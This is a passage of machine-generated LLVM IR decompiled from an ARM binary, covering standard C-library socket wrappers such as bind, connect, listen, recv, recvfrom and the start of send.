  %v2_12a403 = load i8, i8* %v1_12a402, align 1
  %v2_12a445 = icmp eq i8 %v2_12a403, 0
  store i1 %v2_12a445, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_12a403, i8* %arg1, align 1
  br i1 %v2_12a445, label %dec_label_pc_12a50, label %dec_label_pc_12a38

dec_label_pc_12a38:                               ; preds = %entry, %dec_label_pc_12a38
  %v0_12a38 = load i32, i32* @r1, align 4
  %v1_12a38 = add i32 %v0_12a38, 1
  store i32 %v1_12a38, i32* @r1, align 4
  %v0_12a3c = load i32, i32* %r2.global-to-local, align 4
  %v1_12a3c = add i32 %v0_12a3c, 1
  store i32 %v1_12a3c, i32* %r2.global-to-local, align 4
  %v1_12a40 = inttoptr i32 %v1_12a38 to i8*
  %v2_12a40 = load i8, i8* %v1_12a40, align 1
  %v2_12a44 = icmp eq i8 %v2_12a40, 0
  store i1 %v2_12a44, i1* %cpsr_z.global-to-local, align 1
  %v3_12a48 = inttoptr i32 %v1_12a3c to i8*
  store i8 %v2_12a40, i8* %v3_12a48, align 1
  %v0_12a4c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12a4c, label %dec_label_pc_12a50, label %dec_label_pc_12a38

dec_label_pc_12a50:                               ; preds = %dec_label_pc_12a38, %entry
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12a38, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_12a5c = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_12a5c, i32* @r1, align 4
  %v0_12a60 = call i32 @inet_aton()
  %v2_12a64 = icmp eq i32 %v0_12a60, 0
  %v4_12a68 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_12a64, i32 -1, i32 %v4_12a68
  ret i32 %storemerge
}

define i32 @bind(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12a7c = load i32, i32* @r7, align 4
  store i32 %v3_12a7c, i32* %stack_var_-8, align 4
  %v0_12a88 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12a88, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12a88, -4095
  br i1 %tmp, label %dec_label_pc_12ab0, label %dec_label_pc_12a98

dec_label_pc_12a98:                               ; preds = %entry
  %v0_12a9c = call i32 @__aeabi_read_tp()
  %v3_12aa0 = load i16, i16* @global_var_23068.362, align 2
  %v4_12aa0 = sext i16 %v3_12aa0 to i32
  %v0_12aa4 = load i32, i32* %r2.global-to-local, align 4
  %v1_12aa4 = sub i32 0, %v0_12aa4
  store i32 %v1_12aa4, i32* %r2.global-to-local, align 4
  %v3_12aa8 = add i32 %v4_12aa0, %v0_12a9c
  %v4_12aa8 = inttoptr i32 %v3_12aa8 to i32*
  store i32 %v1_12aa4, i32* %v4_12aa8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12ab0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12ab0

dec_label_pc_12ab0:                               ; preds = %entry, %dec_label_pc_12a98
  %v1_12ab4 = phi i32 [ %v0_12a88, %entry ], [ -1, %dec_label_pc_12a98 ]
  %v2_12ab0 = phi i32 [ %v3_12a7c, %entry ], [ %v2_12ab0.pre, %dec_label_pc_12a98 ]
  store i32 %v2_12ab0, i32* @r7, align 4
  ret i32 %v1_12ab4

; uselistorder directives
  uselistorder i32 %v0_12a88, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12ab0, { 1, 0 }
}

define i32 @"$d.8"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12ab8:
  %v0_12ab8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12ab8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12ab8
  %v2_12ab8 = load i32, i32* @sl, align 4
  %v8_12ab8 = shl i32 %v2_12ab8, %arg2
  %v9_12ab8 = and i32 %v8_12ab8, %arg1
  %v5_12abc = sdiv i32 %v9_12ab8, 2048
  %v6_12abc = and i32 %v5_12abc, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12ab8, %bb
  %v7_12abc = phi i32 [ %arg1, %dec_label_pc_12ab8 ], [ %v6_12abc, %bb ]
  ret i32 %v7_12abc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__sys_connect() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12ac0 = load i32, i32* @r7, align 4
  store i32 %v3_12ac0, i32* %stack_var_-8, align 4
  %v0_12acc = load i32, i32* @r0, align 4
  store i32 %v0_12acc, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12acc, -4095
  br i1 %tmp, label %dec_label_pc_12af4, label %dec_label_pc_12adc

dec_label_pc_12adc:                               ; preds = %entry
  %v0_12ae0 = call i32 @__aeabi_read_tp()
  %v3_12ae4 = load i16, i16* @global_var_23068.362, align 2
  %v4_12ae4 = sext i16 %v3_12ae4 to i32
  store i32 %v4_12ae4, i32* @r3, align 4
  %v0_12ae8 = load i32, i32* %r2.global-to-local, align 4
  %v1_12ae8 = sub i32 0, %v0_12ae8
  store i32 %v1_12ae8, i32* %r2.global-to-local, align 4
  %v3_12aec = add i32 %v4_12ae4, %v0_12ae0
  %v4_12aec = inttoptr i32 %v3_12aec to i32*
  store i32 %v1_12ae8, i32* %v4_12aec, align 4
  %v2_12af4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12af4

dec_label_pc_12af4:                               ; preds = %entry, %dec_label_pc_12adc
  %v1_12af8 = phi i32 [ %v0_12acc, %entry ], [ -1, %dec_label_pc_12adc ]
  %v2_12af4 = phi i32 [ %v3_12ac0, %entry ], [ %v2_12af4.pre, %dec_label_pc_12adc ]
  store i32 %v2_12af4, i32* @r7, align 4
  ret i32 %v1_12af8

; uselistorder directives
  uselistorder i32 %v0_12acc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12af4, { 1, 0 }
}

define i32 @"$d.7"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12afc:
  %v0_12afc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12afc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12afc
  %v2_12b00 = load i32, i32* @ip, align 4
  %v3_12b00 = load i32, i32* @r5, align 4
  %v4_12b00 = lshr i32 %v2_12b00, %v3_12b00
  %v5_12b00 = sub i32 32, %v3_12b00
  %v6_12b00 = shl i32 %v2_12b00, %v5_12b00
  %v7_12b00 = or i32 %v6_12b00, %v4_12b00
  %v9_12b00 = and i32 %v7_12b00, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12afc, %bb
  %v10_12b00 = phi i32 [ %arg1, %dec_label_pc_12afc ], [ %v9_12b00, %bb ]
  ret i32 %v10_12b00

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_12b08 = load i32, i32* @r4, align 4
  store i32 %v3_12b08, i32* %stack_var_-20, align 4
  %v6_12b08 = load i32, i32* @r5, align 4
  %v9_12b08 = load i32, i32* @r6, align 4
  %v12_12b08 = load i32, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* @r3, align 4
  %v4_12b14 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 12772) to i32*), align 4
  store i32 %v4_12b14, i32* @ip, align 4
  %v2_12b18 = icmp eq i32 %v4_12b14, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_12b18, label %dec_label_pc_12b30, label %entry.dec_label_pc_12b3c_crit_edge

entry.dec_label_pc_12b3c_crit_edge:               ; preds = %entry
  br label %dec_label_pc_12b3c

dec_label_pc_12b30:                               ; preds = %entry
  store i32 %v3_12b08, i32* @r4, align 4
  store i32 %v9_12b08, i32* @r6, align 4
  store i32 %v12_12b08, i32* @r7, align 4
  %v0_12b38 = call i32 @__sys_connect()
  br label %dec_label_pc_12b3c

dec_label_pc_12b3c:                               ; preds = %entry.dec_label_pc_12b3c_crit_edge, %dec_label_pc_12b30
  %v0_12b3c = call i32 @__libc_enable_asynccancel()
  store i32 %v0_12b3c, i32* @r5, align 4
  %v0_12b4c = load i32, i32* @r4, align 4
  store i32 %v0_12b4c, i32* @r0, align 4
  %v0_12b50 = call i32 @__sys_connect()
  store i32 %v0_12b50, i32* @r4, align 4
  %v0_12b58 = load i32, i32* @r5, align 4
  %v1_12b5c = call i32 @__libc_disable_asynccancel(i32 %v0_12b58)
  %v0_12b60 = load i32, i32* @r4, align 4
  %v2_12b68 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_12b68, i32* @r4, align 4
  store i32 %v6_12b08, i32* @r5, align 4
  store i32 %v9_12b08, i32* @r6, align 4
  store i32 %v12_12b08, i32* @r7, align 4
  ret i32 %v0_12b60

; uselistorder directives
  uselistorder label %dec_label_pc_12b3c, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12b78 = load i32, i32* @r7, align 4
  store i32 %v3_12b78, i32* %stack_var_-8, align 4
  %v0_12b84 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12b84, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12b84, -4095
  br i1 %tmp, label %dec_label_pc_12bac, label %dec_label_pc_12b94

dec_label_pc_12b94:                               ; preds = %entry
  %v0_12b98 = call i32 @__aeabi_read_tp()
  %v3_12b9c = load i16, i16* @global_var_23068.362, align 2
  %v4_12b9c = sext i16 %v3_12b9c to i32
  %v0_12ba0 = load i32, i32* %r2.global-to-local, align 4
  %v1_12ba0 = sub i32 0, %v0_12ba0
  store i32 %v1_12ba0, i32* %r2.global-to-local, align 4
  %v3_12ba4 = add i32 %v4_12b9c, %v0_12b98
  %v4_12ba4 = inttoptr i32 %v3_12ba4 to i32*
  store i32 %v1_12ba0, i32* %v4_12ba4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12bac.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12bac

dec_label_pc_12bac:                               ; preds = %entry, %dec_label_pc_12b94
  %v1_12bb0 = phi i32 [ %v0_12b84, %entry ], [ -1, %dec_label_pc_12b94 ]
  %v2_12bac = phi i32 [ %v3_12b78, %entry ], [ %v2_12bac.pre, %dec_label_pc_12b94 ]
  store i32 %v2_12bac, i32* @r7, align 4
  ret i32 %v1_12bb0

; uselistorder directives
  uselistorder i32 %v0_12b84, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12bac, { 1, 0 }
}

define i32 @"$d.6"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12bb4:
  %v0_12bb4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12bb4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12bb4
  %v2_12bb8 = load i32, i32* @r4, align 4
  %v5_12bb8 = sdiv i32 %v2_12bb8, 512
  %v6_12bb8 = and i32 %v5_12bb8, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12bb4, %bb
  %v7_12bb8 = phi i32 [ %arg1, %dec_label_pc_12bb4 ], [ %v6_12bb8, %bb ]
  ret i32 %v7_12bb8

; uselistorder directives
  uselistorder i32 512, { 0, 8, 5, 1, 6, 9, 2, 10, 3, 11, 4, 12, 7, 13 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_12bbc = load i32, i32* @r4, align 4
  store i32 %v3_12bbc, i32* %stack_var_-12, align 4
  %v0_12bcc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12bcc, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12bcc, -4095
  br i1 %tmp, label %dec_label_pc_12bf4, label %dec_label_pc_12bdc

dec_label_pc_12bdc:                               ; preds = %entry
  %v0_12be0 = call i32 @__aeabi_read_tp()
  %v3_12be4 = load i16, i16* @global_var_23068.362, align 2
  %v4_12be4 = sext i16 %v3_12be4 to i32
  %v0_12be8 = load i32, i32* %r2.global-to-local, align 4
  %v1_12be8 = sub i32 0, %v0_12be8
  store i32 %v1_12be8, i32* %r2.global-to-local, align 4
  %v3_12bec = add i32 %v4_12be4, %v0_12be0
  %v4_12bec = inttoptr i32 %v3_12bec to i32*
  store i32 %v1_12be8, i32* %v4_12bec, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12bf4.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_12bf4

dec_label_pc_12bf4:                               ; preds = %entry, %dec_label_pc_12bdc
  %v1_12bf8 = phi i32 [ %v0_12bcc, %entry ], [ -1, %dec_label_pc_12bdc ]
  %v2_12bf4 = phi i32 [ %v3_12bbc, %entry ], [ %v2_12bf4.pre, %dec_label_pc_12bdc ]
  store i32 %v2_12bf4, i32* @r4, align 4
  ret i32 %v1_12bf8

; uselistorder directives
  uselistorder i32 %v0_12bcc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12bf4, { 1, 0 }
}

define i32 @"$d.5"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12bfc:
  %v0_12bfc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12bfc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12bfc
  %v2_12c00 = load i32, i32* @ip, align 4
  %v3_12c00 = load i32, i32* @r4, align 4
  %v4_12c00 = lshr i32 %v2_12c00, %v3_12c00
  %v5_12c00 = sub i32 32, %v3_12c00
  %v6_12c00 = shl i32 %v2_12c00, %v5_12c00
  %v7_12c00 = or i32 %v6_12c00, %v4_12c00
  %v9_12c00 = and i32 %v7_12c00, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12bfc, %bb
  %v10_12c00 = phi i32 [ %arg1, %dec_label_pc_12bfc ], [ %v9_12c00, %bb ]
  ret i32 %v10_12c00

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @listen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12c04 = load i32, i32* @r7, align 4
  store i32 %v3_12c04, i32* %stack_var_-8, align 4
  %v0_12c10 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12c10, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12c10, -4095
  br i1 %tmp, label %dec_label_pc_12c38, label %dec_label_pc_12c20

dec_label_pc_12c20:                               ; preds = %entry
  %v0_12c24 = call i32 @__aeabi_read_tp()
  %v3_12c28 = load i16, i16* @global_var_23068.362, align 2
  %v4_12c28 = sext i16 %v3_12c28 to i32
  %v0_12c2c = load i32, i32* %r2.global-to-local, align 4
  %v1_12c2c = sub i32 0, %v0_12c2c
  store i32 %v1_12c2c, i32* %r2.global-to-local, align 4
  %v3_12c30 = add i32 %v4_12c28, %v0_12c24
  %v4_12c30 = inttoptr i32 %v3_12c30 to i32*
  store i32 %v1_12c2c, i32* %v4_12c30, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12c38.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12c38

dec_label_pc_12c38:                               ; preds = %entry, %dec_label_pc_12c20
  %v1_12c3c = phi i32 [ %v0_12c10, %entry ], [ -1, %dec_label_pc_12c20 ]
  %v2_12c38 = phi i32 [ %v3_12c04, %entry ], [ %v2_12c38.pre, %dec_label_pc_12c20 ]
  store i32 %v2_12c38, i32* @r7, align 4
  ret i32 %v1_12c3c

; uselistorder directives
  uselistorder i32 %v0_12c10, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12c38, { 1, 0 }
}

define i32 @__sys_recv() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12c44 = load i32, i32* @r7, align 4
  store i32 %v3_12c44, i32* %stack_var_-8, align 4
  %v0_12c50 = load i32, i32* @r0, align 4
  store i32 %v0_12c50, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12c50, -4095
  br i1 %tmp, label %dec_label_pc_12c78, label %dec_label_pc_12c60

dec_label_pc_12c60:                               ; preds = %entry
  %v0_12c64 = call i32 @__aeabi_read_tp()
  %v3_12c68 = load i16, i16* @global_var_23068.362, align 2
  %v4_12c68 = sext i16 %v3_12c68 to i32
  %v0_12c6c = load i32, i32* %r2.global-to-local, align 4
  %v1_12c6c = sub i32 0, %v0_12c6c
  store i32 %v1_12c6c, i32* %r2.global-to-local, align 4
  %v3_12c70 = add i32 %v4_12c68, %v0_12c64
  %v4_12c70 = inttoptr i32 %v3_12c70 to i32*
  store i32 %v1_12c6c, i32* %v4_12c70, align 4
  %v2_12c78.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12c78

dec_label_pc_12c78:                               ; preds = %entry, %dec_label_pc_12c60
  %v1_12c7c = phi i32 [ %v0_12c50, %entry ], [ -1, %dec_label_pc_12c60 ]
  %v2_12c78 = phi i32 [ %v3_12c44, %entry ], [ %v2_12c78.pre, %dec_label_pc_12c60 ]
  store i32 %v2_12c78, i32* @r7, align 4
  ret i32 %v1_12c7c

; uselistorder directives
  uselistorder i32 %v0_12c50, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12c78, { 1, 0 }
}

define i32 @"$d.4"(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12c80:
  %v0_12c80 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12c80, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12c80
  %v5_12c80 = udiv i32 %arg3, 4
  %v6_12c80 = and i32 %v5_12c80, %arg1
  store i32 %v6_12c80, i32* %arg2, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12c80, %bb
  %v8_12c84 = phi i32 [ %arg1, %dec_label_pc_12c80 ], [ %v6_12c80, %bb ]
  ret i32 %v8_12c84

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_12c8c = load i32, i32* @r4, align 4
  store i32 %v3_12c8c, i32* %stack_var_-24, align 4
  %v6_12c8c = load i32, i32* @r5, align 4
  %v9_12c8c = load i32, i32* @r6, align 4
  %v12_12c8c = load i32, i32* @r7, align 4
  %v15_12c8c = load i32, i32* @r8, align 4
  %v18_12c8c = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* @ip, align 4
  %v4_12c98 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 12772) to i32*), align 4
  %v2_12c9c = icmp eq i32 %v4_12c98, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_12c9c, label %dec_label_pc_12cb4, label %entry.dec_label_pc_12cbc_crit_edge

entry.dec_label_pc_12cbc_crit_edge:               ; preds = %entry
  br label %dec_label_pc_12cbc

dec_label_pc_12cb4:                               ; preds = %entry
  store i32 %v3_12c8c, i32* @r4, align 4
  store i32 %v9_12c8c, i32* @r6, align 4
  store i32 %v12_12c8c, i32* @r7, align 4
  store i32 %v15_12c8c, i32* @r8, align 4
  %v0_12cb8 = call i32 @__sys_recv()
  br label %dec_label_pc_12cbc

dec_label_pc_12cbc:                               ; preds = %entry.dec_label_pc_12cbc_crit_edge, %dec_label_pc_12cb4
  %v0_12cbc = call i32 @__libc_enable_asynccancel()
  %v0_12cc0 = load i32, i32* @r6, align 4
  store i32 %v0_12cc0, i32* @r1, align 4
  store i32 %v0_12cbc, i32* @r5, align 4
  %v0_12cd0 = load i32, i32* @r4, align 4
  store i32 %v0_12cd0, i32* @r0, align 4
  %v0_12cd4 = call i32 @__sys_recv()
  store i32 %v0_12cd4, i32* @r4, align 4
  %v0_12cdc = load i32, i32* @r5, align 4
  %v1_12ce0 = call i32 @__libc_disable_asynccancel(i32 %v0_12cdc)
  %v0_12ce4 = load i32, i32* @r4, align 4
  %v2_12ce8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_12ce8, i32* @r4, align 4
  store i32 %v6_12c8c, i32* @r5, align 4
  store i32 %v9_12c8c, i32* @r6, align 4
  store i32 %v12_12c8c, i32* @r7, align 4
  store i32 %v15_12c8c, i32* @r8, align 4
  store i32 %v18_12c8c, i32* @lr, align 4
  ret i32 %v0_12ce4

; uselistorder directives
  uselistorder label %dec_label_pc_12cbc, { 1, 0 }
}

define i32 @__sys_recvfrom() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_12cf8 = load i32, i32* @r4, align 4
  store i32 %v3_12cf8, i32* %stack_var_-16, align 4
  %v0_12d0c = load i32, i32* @r0, align 4
  store i32 %v0_12d0c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12d0c, -4095
  br i1 %tmp, label %dec_label_pc_12d34, label %dec_label_pc_12d1c

dec_label_pc_12d1c:                               ; preds = %entry
  %v0_12d20 = call i32 @__aeabi_read_tp()
  %v3_12d24 = load i16, i16* @global_var_23068.362, align 2
  %v4_12d24 = sext i16 %v3_12d24 to i32
  %v0_12d28 = load i32, i32* %r2.global-to-local, align 4
  %v1_12d28 = sub i32 0, %v0_12d28
  store i32 %v1_12d28, i32* %r2.global-to-local, align 4
  %v3_12d2c = add i32 %v4_12d24, %v0_12d20
  %v4_12d2c = inttoptr i32 %v3_12d2c to i32*
  store i32 %v1_12d28, i32* %v4_12d2c, align 4
  %v2_12d34.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_12d34

dec_label_pc_12d34:                               ; preds = %entry, %dec_label_pc_12d1c
  %v1_12d38 = phi i32 [ %v0_12d0c, %entry ], [ -1, %dec_label_pc_12d1c ]
  %v2_12d34 = phi i32 [ %v3_12cf8, %entry ], [ %v2_12d34.pre, %dec_label_pc_12d1c ]
  store i32 %v2_12d34, i32* @r4, align 4
  ret i32 %v1_12d38

; uselistorder directives
  uselistorder i32 %v0_12d0c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12d34, { 1, 0 }
}

define i32 @__libc_recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_12d40 = load i32, i32* @r4, align 4
  store i32 %v3_12d40, i32* %stack_var_-32, align 4
  %v6_12d40 = load i32, i32* @r5, align 4
  %v9_12d40 = load i32, i32* @r6, align 4
  %v12_12d40 = load i32, i32* @r7, align 4
  %v15_12d40 = load i32, i32* @r8, align 4
  %v18_12d40 = load i32, i32* @sb, align 4
  %v21_12d40 = load i32, i32* @sl, align 4
  %v24_12d40 = load i32, i32* @lr, align 4
  %v4_12d50 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 12772) to i32*), align 4
  %v2_12d58 = icmp eq i32 %v4_12d50, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_12d58, label %dec_label_pc_12d78, label %dec_label_pc_12d84

dec_label_pc_12d78:                               ; preds = %entry
  store i32 %v3_12d40, i32* @r4, align 4
  store i32 %v12_12d40, i32* @r7, align 4
  store i32 %v15_12d40, i32* @r8, align 4
  store i32 %v18_12d40, i32* %sb.global-to-local, align 4
  %v0_12d80 = call i32 @__sys_recvfrom()
  br label %dec_label_pc_12d84

dec_label_pc_12d84:                               ; preds = %entry, %dec_label_pc_12d78
  %v0_12d84 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_12d84, i32* @r5, align 4
  %v0_12d98 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_12d98, i32* @r0, align 4
  %v0_12da0 = call i32 @__sys_recvfrom()
  store i32 %v0_12da0, i32* @r4, align 4
  %v0_12da8 = load i32, i32* @r5, align 4
  %v1_12dac = call i32 @__libc_disable_asynccancel(i32 %v0_12da8)
  %v0_12db0 = load i32, i32* @r4, align 4
  %v2_12db8 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_12db8, i32* @r4, align 4
  store i32 %v6_12d40, i32* @r5, align 4
  store i32 %v9_12d40, i32* @r6, align 4
  store i32 %v12_12d40, i32* @r7, align 4
  store i32 %v15_12d40, i32* @r8, align 4
  store i32 %v18_12d40, i32* @sb, align 4
  store i32 %v21_12d40, i32* @sl, align 4
  store i32 %v24_12d40, i32* @lr, align 4
  ret i32 %v0_12db0

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12d84, { 1, 0 }
}

define i32 @__sys_send() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12dc8 = load i32, i32* @r7, align 4
  store i32 %v3_12dc8, i32* %stack_var_-8, align 4
  %v0_12dd4 = load i32, i32* @r0, align 4
  store i32 %v0_12dd4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12dd4, -4095
  br i1 %tmp, label %dec_label_pc_12dfc, label %dec_label_pc_12de4

dec_label_pc_12de4:                               ; preds = %entry
  %v0_12de8 = call i32 @__aeabi_read_tp()
  %v3_12dec = load i16, i16* @global_var_23068.362, align 2
  %v4_12dec = sext i16 %v3_12dec to i32
  store i32 %v4_12dec, i32* @r3, align 4
  %v0_12df0 = load i32, i32* %r2.global-to-local, align 4
  %v1_12df0 = sub i32 0, %v0_12df0
  store i32 %v1_12df0, i32* %r2.global-to-local, align 4
  %v3_12df4 = add i32 %v4_12dec, %v0_12de8
  %v4_12df4 = inttoptr i32 %v3_12df4 to i32*
  store i32 %v1_12df0, i32* %v4_12df4, align 4
  %v2_12dfc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12dfc

dec_label_pc_12dfc:                               ; preds = %entry, %dec_label_pc_12de4
  %v1_12e00 = phi i32 [ %v0_12dd4, %entry ], [ -1, %dec_label_pc_12de4 ]
  %v2_12dfc = phi i32 [ %v3_12dc8, %entry ], [ %v2_12dfc.pre, %dec_label_pc_12de4 ]
  store i32 %v2_12dfc, i32* @r7, align 4
  ret i32 %v1_12e00

; uselistorder directives
  uselistorder i32 %v0_12dd4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12dfc, { 1, 0 }
}

define i32 @"$d.3"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12e04:
  %v0_12e04 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12e04, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12e04
  %v2_12e08 = load i32, i32* @r4, align 4
  %v4_12e08 = lshr i32 %v2_12e08, %arg3
  %v5_12e08 = sub i32 32, %arg3
  %v6_12e08 = shl i32 %v2_12e08, %v5_12e08
  %v7_12e08 = or i32 %v6_12e08, %v4_12e08
  %v9_12e08 = and i32 %v7_12e08, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12e04, %bb
  %v10_12e08 = phi i32 [ %arg1, %dec_label_pc_12e04 ], [ %v9_12e08, %bb ]
  ret i32 %v10_12e08

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_12e10 = load i32, i32* @r4, align 4
  store i32 %v3_12e10, i32* %stack_var_-24, align 4
  %v6_12e10 = load i32, i32* @r5, align 4
  %v9_12e10 = load i32, i32* @r6, align 4
